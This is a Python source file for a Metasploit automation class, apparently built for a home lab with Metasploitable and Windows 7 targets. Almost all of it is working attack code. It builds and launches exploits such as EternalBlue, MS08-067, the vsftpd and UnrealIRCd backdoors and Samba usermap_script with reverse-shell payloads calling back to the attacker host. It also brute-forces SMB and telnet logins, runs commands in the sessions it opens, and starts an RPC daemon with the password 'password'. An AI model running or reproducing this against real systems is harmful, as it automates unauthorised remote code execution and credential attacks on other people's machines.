"""
Real Metasploit Integration for Exploitation
"""

import subprocess
import time
import tempfile
import os
import socket
import threading
import queue
import re
from typing import Tuple, Dict, List
from datetime import datetime

class ExploitController:
    """Real Metasploit exploit controller with meterpreter integration"""
    
    def __init__(self):
        self.exploit_db = self.load_exploit_database()
        self.sessions = {}
        self.msf_process = None
        
    def load_exploit_database(self) -> Dict:
        """Load real exploit database for Windows 7 and Metasploitable"""
        return {
            # Windows exploits
            'MS17-010 (EternalBlue)': {
                'module': 'exploit/windows/smb/ms17_010_eternalblue',
                'port': 445,
                'payload': 'windows/x64/meterpreter/reverse_tcp',
                'description': 'SMBv1 Remote Code Execution (EternalBlue)',
                'type': 'remote_rce',
                'lport': 4444,
                'platform': 'windows'
            },
            'MS08-067 (NetAPI)': {
                'module': 'exploit/windows/smb/ms08_067_netapi',
                'port': 445,
                'payload': 'windows/meterpreter/reverse_tcp',
                'description': 'Server Service RCE (MS08-067)',
                'type': 'remote_rce',
                'lport': 4445,
                'platform': 'windows'
            },
            'SMB Login Bruteforce': {
                'module': 'auxiliary/scanner/smb/smb_login',
                'port': 445,
                'description': 'SMB Login Check with common credentials',
                'type': 'bruteforce',
                'lport': None,
                'platform': 'windows'
            },
            
            # Metasploitable exploits
            'vsftpd 2.3.4 Backdoor': {
                'module': 'exploit/unix/ftp/vsftpd_234_backdoor',
                'port': 21,
                'payload': 'cmd/unix/interact',
                'description': 'vsftpd 2.3.4 backdoor command execution',
                'type': 'backdoor',
                'lport': 6200,
                'platform': 'linux'
            },
            'Samba usermap_script': {
                'module': 'exploit/multi/samba/usermap_script',
                'port': 139,
                'payload': 'cmd/unix/reverse_netcat',
                'description': 'Samba "username map script" Command Execution',
                'type': 'remote_rce',
                'lport': 4446,
                'platform': 'linux'
            },
            'PHP CGI Argument Injection': {
                'module': 'exploit/multi/http/php_cgi_arg_injection',
                'port': 80,
                'payload': 'php/meterpreter/reverse_tcp',
                'description': 'PHP CGI Argument Injection RCE',
                'type': 'remote_rce',
                'lport': 4447,
                'platform': 'linux'
            },
            'Telnet Login': {
                'module': 'auxiliary/scanner/telnet/telnet_login',
                'port': 23,
                'payload': None,
                'description': 'Telnet login with default credentials',
                'type': 'login',
                'lport': None,
                'platform': 'linux'
            },
            'DistCC Daemon RCE': {
                'module': 'exploit/unix/misc/distcc_exec',
                'port': 3632,
                'payload': 'cmd/unix/reverse_bash',
                'description': 'DistCC Daemon Command Execution',
                'type': 'remote_rce',
                'lport': 4448,
                'platform': 'linux'
            },
            'UnrealIRCd Backdoor': {
                'module': 'exploit/unix/irc/unreal_ircd_3281_backdoor',
                'port': 6667,
                'payload': 'cmd/unix/reverse_bash',
                'description': 'UnrealIRCd 3.2.8.1 Backdoor Command Execution',
                'type': 'backdoor',
                'lport': 4449,
                'platform': 'linux'
            }
        }
    
    def start_msfrpcd(self):
        """Start MSF RPC daemon for API access"""
        try:
            # Check if already running
            result = subprocess.run(['pgrep', 'msfrpcd'], capture_output=True)
            if result.returncode == 0:
                print("[+] MSF RPC daemon already running")
                return True
            
            print("[*] Starting MSF RPC daemon...")
            # Start msfrpcd with password 'password' on port 55553
            self.msf_process = subprocess.Popen(
                ['msfrpcd', '-P', 'password', '-S', '-f'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(5)  # Wait for startup
            print("[+] MSF RPC daemon started")
            return True
            
        except Exception as e:
            print(f"[-] Failed to start MSF RPC: {e}")
            return False
    
    def execute_exploit(self, target_ip: str, exploit_name: str, port: int = None, lhost: str = None, lport: int = None) -> Tuple[bool, Dict]:
        """
        Execute REAL exploit using Metasploit and get meterpreter session
        """
        if exploit_name not in self.exploit_db:
            return False, {'error': f'Exploit {exploit_name} not found'}
        
        exploit_info = self.exploit_db[exploit_name]
        
        if lhost is None:
            lhost = self.get_local_ip()
        
        if lport is None:
            lport = exploit_info.get('lport', 4444)
        
        # Use provided port or default from exploit info
        exploit_port = port or exploit_info['port']
        
        print(f"[*] Executing {exploit_name} on {target_ip}:{exploit_port}")
        print(f"[*] Using module: {exploit_info['module']}")
        print(f"[*] Payload: {exploit_info.get('payload', 'N/A')}")
        print(f"[*] LHOST: {lhost}, LPORT: {lport}")
        
        # Run the exploit
        success, session_data = self.run_metasploit_exploit(
            target_ip, exploit_name, exploit_info, lhost, lport, exploit_port
        )
        
        if success:
            # Store session for later interaction
            session_id = session_data.get('id', '1')
            self.sessions[session_id] = {
                'id': session_id,
                'target': target_ip,
                'exploit': exploit_name,
                'platform': exploit_info.get('platform', 'unknown'),
                'data': session_data,
                'timestamp': datetime.now().isoformat()
            }
        
        return success, session_data
    
    def run_metasploit_exploit(self, target_ip: str, exploit_name: str, 
                              exploit_info: Dict, lhost: str, lport: int, port: int) -> Tuple[bool, Dict]:
        """Run Metasploit exploit and capture session"""
        
        # Create resource file
        resource_content = self.create_resource_file(
            target_ip, exploit_name, exploit_info, lhost, lport, port
        )
        
        # Write resource file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write(resource_content)
            resource_file = f.name
        
        try:
            print(f"[*] Launching Metasploit with resource file...")
            
            # Run Metasploit and capture output in real-time
            output_queue = queue.Queue()
            
            def run_msf():
                process = subprocess.Popen(
                    ['msfconsole', '-q', '-r', resource_file],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )
                
                # Read output line by line
                for line in iter(process.stdout.readline, ''):
                    output_queue.put(line.strip())
                
                process.stdout.close()
                return_code = process.wait()
                output_queue.put(f"EXIT:{return_code}")
            
            # Start Metasploit in separate thread
            msf_thread = threading.Thread(target=run_msf)
            msf_thread.daemon = True
            msf_thread.start()
            
            # Monitor output for session creation
            session_id = None
            output_lines = []
            start_time = time.time()
            session_created = False
            vsftpd_success = False
            
            while time.time() - start_time < 120:  # Wait up to 120 seconds for Linux exploits
                try:
                    line = output_queue.get(timeout=2)
                    output_lines.append(line)
                    
                    print(f"[MSF] {line}")
                    
                    # Check for session creation (different patterns for different exploits)
                    session_patterns = [
                        r'Command shell session (\d+) opened',
                        r'Meterpreter session (\d+) opened',
                        r'Session (\d+) created',
                        r'opened session (\d+)',
                        r'session (\d+) opened',  # More general pattern
                        r'Found shell',  # vsftpd specific
                        r'UID: uid=0\(root\)',  # vsftpd success indicator
                        r'opening connection to'  # vsftpd backdoor connection
                    ]
                    
                    # Special handling for vsftpd
                    if 'vsftpd' in exploit_name.lower():
                        if 'Found shell' in line or 'UID: uid=0(root)' in line:
                            session_created = True
                            session_id = '1'  # vsftpd usually creates session 1
                            vsftpd_success = True
                            break
                        elif 'opening connection to' in line.lower():
                            session_created = True
                            session_id = 'vsftpd_backdoor'
                            vsftpd_success = True
                            # Wait a bit more for the actual session
                            continue
                    
                    # Check for other session patterns
                    for pattern in session_patterns:
                        match = re.search(pattern, line.lower())
                        if match:
                            # Extract session ID if available
                            if match.lastindex and match.group(1):
                                session_id = match.group(1)
                            else:
                                session_id = '1'  # Default session ID
                            session_created = True
                            break
                    
                    if line.startswith('EXIT:'):
                        break
                        
                except queue.Empty:
                    continue
            
            os.unlink(resource_file)
            
            # For vsftpd, we might need to manually check for sessions
            if 'vsftpd' in exploit_name.lower() and not session_created:
                # Check if vsftpd created a session anyway
                session_created = self.check_vsftpd_session()
                if session_created:
                    session_id = '1'
                    vsftpd_success = True
            
            if session_created:
                print(f"[+] SUCCESS! Session {session_id} created!")
                
                # Determine user based on platform
                if exploit_info.get('platform') == 'linux':
                    user = 'root'
                    privilege = 'root'
                    session_type = 'shell'
                else:
                    user = 'SYSTEM'
                    privilege = 'NT AUTHORITY\\SYSTEM'
                    session_type = 'meterpreter'
                
                session_data = {
                    'id': session_id,
                    'target': target_ip,
                    'exploit': exploit_name,
                    'user': user,
                    'privilege': privilege,
                    'platform': exploit_info.get('platform', 'unknown'),
                    'session_type': session_type,
                    'timestamp': datetime.now().isoformat(),
                    'success': True,
                    'type': exploit_info['type'],
                    'lhost': lhost,
                    'lport': lport,
                    'port': port
                }
                
                # Special handling for vsftpd
                if vsftpd_success:
                    print(f"[+] vsftpd backdoor successful! Shell should be available on port 6200")
                    session_data['vsftpd'] = True
                    session_data['backdoor_port'] = 6200
                
                # Verify session for meterpreter sessions
                if session_type == 'meterpreter' and not vsftpd_success:
                    if self.verify_session(session_id):
                        print(f"[+] Session {session_id} verified and ready!")
                        return True, session_data
                    else:
                        print(f"[-] Session {session_id} not responding")
                        return False, {'error': 'Session created but not responding'}
                else:
                    # For shell sessions (including vsftpd), just return success
                    print(f"[+] Shell session ready!")
                    return True, session_data
            
            print("[-] No session created")
            return False, {'error': 'Exploit failed - no session created', 'output': '\n'.join(output_lines[-20:])}
            
        except Exception as e:
            print(f"[-] Error during exploitation: {e}")
            return False, {'error': str(e)}
    
    def check_vsftpd_session(self):
        """Check if vsftpd created a session"""
        try:
            # Check for active sessions in Metasploit
            cmd = "msfconsole -q -x 'sessions; exit'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            # Check if there's any session
            if 'Active sessions' in result.stdout or 'session' in result.stdout.lower():
                return True
            return False
        except:
            return False
    
    def create_resource_file(self, target_ip: str, exploit_name: str, 
                           exploit_info: Dict, lhost: str, lport: int, port: int) -> str:
        """Create Metasploit resource file"""
        
        resource = f"""
use {exploit_info['module']}
set RHOSTS {target_ip}
set RPORT {port}
"""
        
        # Special handling for vsftpd - it doesn't use LHOST/LPORT
        if 'vsftpd_234_backdoor' in exploit_info['module']:
            resource += """
set PAYLOAD cmd/unix/interact
exploit -z
"""
            return resource
        
        if exploit_info['type'] not in ['bruteforce', 'login'] and exploit_info.get('payload'):
            resource += f"""
set PAYLOAD {exploit_info['payload']}
set LHOST {lhost}
set LPORT {lport}
"""
            # Don't add ExitOnSession for modules that don't support it
            # This caused errors in your output
        
        # Add exploit-specific settings
        if 'ms17_010' in exploit_info['module']:
            resource += """
set VERIFY_ARCH false
set VERIFY_TARGET false
set ProcessName spoolsv.exe
"""
        elif 'ms08_067' in exploit_info['module']:
            resource += """
set target 3  # Windows 7
"""
        elif 'smb_login' in exploit_info['module']:
            resource += f"""
set USER_FILE /usr/share/wordlists/metasploit/common_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/common_passwords.txt
set STOP_ON_SUCCESS true
"""
        elif 'telnet_login' in exploit_info['module']:
            resource += f"""
set USERNAME msfadmin
set PASSWORD msfadmin
set STOP_ON_SUCCESS true
"""
        elif 'samba' in exploit_info['module']:
            # Samba usermap_script - remove ExitOnSession
            resource += f"""
set PAYLOAD {exploit_info['payload']}
set LHOST {lhost}
set LPORT {lport}
"""
        elif 'distcc_exec' in exploit_info['module']:
            # DistCC exploit
            resource += """
set CMD whoami
"""
        elif 'unreal_ircd' in exploit_info['module']:
            # UnrealIRCd backdoor
            resource += f"""
set PAYLOAD {exploit_info['payload']}
set LHOST {lhost}
set LPORT {lport}
"""
        
        resource += """
exploit
"""
        
        return resource
    
    def execute_simple_shell_command(self, command: str) -> str:
        """Execute a simple shell command and return output"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            return result.stdout
        except Exception as e:
            return f"Error: {str(e)}"
    
    def get_metasploitable_vulnerabilities(self, target_ip: str) -> List[Dict]:
        """Scan Metasploitable for known vulnerabilities"""
        vulnerabilities = []
        
        # Common Metasploitable services
        services = {
            21: 'vsftpd 2.3.4',
            22: 'OpenSSH',
            23: 'telnetd',
            25: 'Postfix SMTP',
            53: 'ISC BIND',
            80: 'Apache 2.2.8',
            111: 'rpcbind',
            139: 'Samba smbd',
            445: 'Samba smbd',
            512: 'rexec',
            513: 'rlogin',
            514: 'rsh',
            1099: 'Java RMI',
            1524: 'ingreslock backdoor',
            2049: 'NFS',
            2121: 'ProFTPD',
            3306: 'MySQL',
            5432: 'PostgreSQL',
            5900: 'VNC',
            6000: 'X11',
            6667: 'UnrealIRCd',
            8009: 'Apache JServ',
            8180: 'Apache Tomcat',
            8787: 'DRb RMI'
        }
        
        # Quick port scan
        try:
            import nmap
            nm = nmap.PortScanner()
            
            print(f"[*] Scanning {target_ip} for Metasploitable services...")
            
            # Scan common ports
            ports_to_scan = ','.join(str(port) for port in services.keys())
            nm.scan(target_ip, ports_to_scan, arguments='-sS -T4')
            
            if target_ip in nm.all_hosts():
                for proto in nm[target_ip].all_protocols():
                    if proto in ['tcp', 'udp']:
                        ports = nm[target_ip][proto].keys()
                        for port in ports:
                            if nm[target_ip][proto][port]['state'] == 'open':
                                service_name = services.get(port, 'Unknown')
                                vulnerabilities.append({
                                    'port': port,
                                    'service': service_name,
                                    'state': 'open',
                                    'vulnerable': True,
                                    'exploits': self.get_exploits_for_service(port, service_name)
                                })
        except ImportError:
            print("[-] nmap module not available")
        except Exception as e:
            print(f"[-] Scan error: {e}")
        
        return vulnerabilities
    
    def get_exploits_for_service(self, port: int, service: str) -> List[str]:
        """Get available exploits for a service"""
        exploits = []
        
        if port == 21 and 'vsftpd' in service:
            exploits.append('vsftpd 2.3.4 Backdoor')
        
        if port in [139, 445] and 'Samba' in service:
            exploits.append('Samba usermap_script')
        
        if port == 23:
            exploits.append('Telnet Login')
        
        if port == 80:
            exploits.append('PHP CGI Argument Injection')
        
        if port == 3632:
            exploits.append('DistCC Daemon RCE')
        
        if port == 6667:
            exploits.append('UnrealIRCd Backdoor')
        
        return exploits
    
    def verify_session(self, session_id: str) -> bool:
        """Verify that a session is active"""
        try:
            # Quick check using msfconsole
            check_cmd = f"msfconsole -q -x 'sessions -i {session_id} -c \"getuid\"; exit'"
            result = subprocess.run(
                check_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            return 'Server username:' in result.stdout or 'uid=' in result.stdout
            
        except:
            return False
    
    def execute_meterpreter_command(self, session_id: str, command: str) -> str:
        """Execute a command in meterpreter session"""
        try:
            # Check if it's a shell session (Linux) or meterpreter
            session = self.sessions.get(session_id, {})
            
            if session.get('session_type') == 'shell':
                # For shell sessions, we need to handle differently
                # For vsftpd, we can connect directly to the backdoor port
                if session.get('vsftpd'):
                    # Connect to vsftpd backdoor port 6200
                    import telnetlib
                    try:
                        tn = telnetlib.Telnet(session.get('target'), 6200, timeout=10)
                        tn.write(command.encode() + b'\n')
                        response = tn.read_some().decode()
                        tn.close()
                        return response
                    except:
                        return f"Could not connect to vsftpd backdoor on port 6200"
                
                # For other shell sessions
                return self.execute_simple_shell_command(command)
            
            # Create command file for meterpreter
            cmd_file = tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False)
            
            if command.lower() == 'shell':
                cmd_content = f"""
sessions -i {session_id}
shell
echo COMMAND_COMPLETE
"""
            else:
                cmd_content = f"""
sessions -i {session_id}
{command}
"""
            
            cmd_file.write(cmd_content)
            cmd_file.close()
            
            # Execute command
            result = subprocess.run(
                ['msfconsole', '-q', '-r', cmd_file.name],
                capture_output=True,
                text=True,
                timeout=30  # Longer timeout for meterpreter commands
            )
            
            os.unlink(cmd_file.name)
            
            # Clean up output
            output = result.stdout
            
            # Remove msfconsole banner and prompt
            lines = output.split('\n')
            cleaned_lines = []
            
            for line in lines:
                if not any(x in line for x in ['msf6', 'meterpreter', '>', 'Session', '[*]', 'Starting', 'Stopping']):
                    cleaned_lines.append(line)
            
            return '\n'.join(cleaned_lines).strip()
            
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def get_session_info(self, session_id: str) -> Dict:
        """Get detailed info about a session"""
        try:
            session = self.sessions.get(session_id, {})
            
            if session.get('platform') == 'linux':
                # For Linux shell sessions
                if session.get('session_type') == 'shell':
                    return {
                        'session_id': session_id,
                        'platform': 'linux',
                        'user': session.get('user', 'root'),
                        'host': session.get('target', 'unknown'),
                        'active': True,
                        'type': 'shell',
                        'exploit': session.get('exploit', 'unknown'),
                        'vsftpd': session.get('vsftpd', False)
                    }
            
            # For meterpreter sessions
            sysinfo = self.execute_meterpreter_command(session_id, 'sysinfo')
            getuid = self.execute_meterpreter_command(session_id, 'getuid')
            
            info = {
                'session_id': session_id,
                'sysinfo': sysinfo,
                'user': getuid,
                'active': True,
                'platform': session.get('platform', 'unknown'),
                'timestamp': datetime.now().isoformat()
            }
            
            return info
            
        except:
            return {'session_id': session_id, 'active': False}
    
    def get_active_sessions(self) -> List[Dict]:
        """Get list of all active sessions"""
        try:
            result = subprocess.run(
                ['msfconsole', '-q', '-x', 'sessions; exit'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            sessions = []
            
            # Parse session list
            lines = result.stdout.split('\n')
            for line in lines:
                match = re.match(r'^\s*(\d+)\s+(\S+)\s+(\S+)\s+(.+)', line)
                if match:
                    session_id = match.group(1)
                    session_type = match.group(2)
                    
                    # Check if it's in our managed sessions
                    if session_id in self.sessions:
                        session_info = self.sessions[session_id]
                    else:
                        session_info = {'platform': 'unknown', 'exploit': 'unknown'}
                    
                    sessions.append({
                        'id': session_id,
                        'type': session_type,
                        'platform': session_info.get('platform', 'unknown'),
                        'exploit': session_info.get('exploit', 'unknown'),
                        'info': match.group(4),
                        'active': True
                    })
            
            return sessions
            
        except:
            return []
    
    def close_session(self, session_id: str) -> bool:
        """Close a meterpreter session"""
        try:
            result = subprocess.run(
                f"msfconsole -q -x 'sessions -k {session_id}; exit'",
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if session_id in self.sessions:
                del self.sessions[session_id]
            
            return 'Session' in result.stdout and 'closed' in result.stdout
            
        except:
            return False
    
    def stop_msfrpcd(self):
        """Stop MSF RPC daemon"""
        try:
            if self.msf_process:
                self.msf_process.terminate()
                self.msf_process.wait(timeout=5)
                print("[+] MSF RPC daemon stopped")
            return True
        except:
            # Force kill if needed
            subprocess.run(['pkill', 'msfrpcd'], capture_output=True)
            return False
    
    def get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            # Try to get Kali IP from common lab networks
            interfaces = ['eth1', 'eth0', 'ens33', 'ens38']
            
            for iface in interfaces:
                try:
                    cmd = f"ip addr show {iface} | grep 'inet ' | awk '{{print $2}}' | cut -d/ -f1"
                    ip = subprocess.check_output(cmd, shell=True, text=True).strip()
                    if ip and ip.startswith('192.168.56.'):
                        return ip
                except:
                    continue
            
            # Fallback: get default route IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return '192.168.56.112'  # Your Kali IP
    
    def check_vulnerability(self, target_ip: str, port: int, service: str) -> Dict:
        """Check vulnerability using Nmap"""
        try:
            import nmap
            
            nm = nmap.PortScanner()
            
            if service.lower() == 'smb' and port == 445:
                print(f"[*] Checking MS17-010...")
                result = nm.scan(target_ip, '445', arguments='--script smb-vuln-ms17-010')
                
                if target_ip in result['scan'] and 'tcp' in result['scan'][target_ip]:
                    scripts = result['scan'][target_ip]['tcp'][445].get('script', {})
                    if 'smb-vuln-ms17-010' in scripts and 'VULNERABLE' in str(scripts['smb-vuln-ms17-010']):
                        return {
                            'vulnerable': True,
                            'name': 'MS17-010 (EternalBlue)',
                            'risk': 'Critical',
                            'details': 'EternalBlue vulnerability confirmed'
                        }
            
            # Add Metasploitable checks
            if port == 21 and 'ftp' in service.lower():
                result = nm.scan(target_ip, '21', arguments='--script ftp-vsftpd-backdoor')
                if target_ip in result['scan'] and 'tcp' in result['scan'][target_ip]:
                    scripts = result['scan'][target_ip]['tcp'][21].get('script', {})
                    if 'ftp-vsftpd-backdoor' in scripts:
                        return {
                            'vulnerable': True,
                            'name': 'vsftpd 2.3.4 Backdoor',
                            'risk': 'Critical',
                            'details': 'vsftpd backdoor detected'
                        }
            
            return {'vulnerable': False}
            
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}